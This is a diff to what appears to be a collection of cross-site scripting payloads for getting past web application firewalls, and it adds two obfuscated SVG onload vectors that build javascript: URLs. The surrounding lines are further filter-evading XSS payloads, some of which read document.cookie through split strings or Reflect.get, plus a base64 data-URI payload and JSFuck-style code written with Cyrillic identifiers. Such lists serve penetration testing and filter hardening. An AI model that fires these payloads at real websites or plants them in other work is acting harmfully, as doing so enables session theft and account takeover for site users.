@@ -64,6 +64,8 @@ onfocus=alert%26#40document.domain%26#41+autofocus+tabindex=1
 "><img src=x onerrora=confirm() onerror=confirm(1)>
 "><img src=x onerror=alert(1)>
 <meta hx-trigger='x[1)}),alert(3);//]'>
+<Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)//
+<Svg OnLoad= location=`Java${/S/.source}cript:alert${"\50"}1)`>
 "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 <details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
 <object data=`data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=`></object>
@@ -1747,5 +1749,6 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
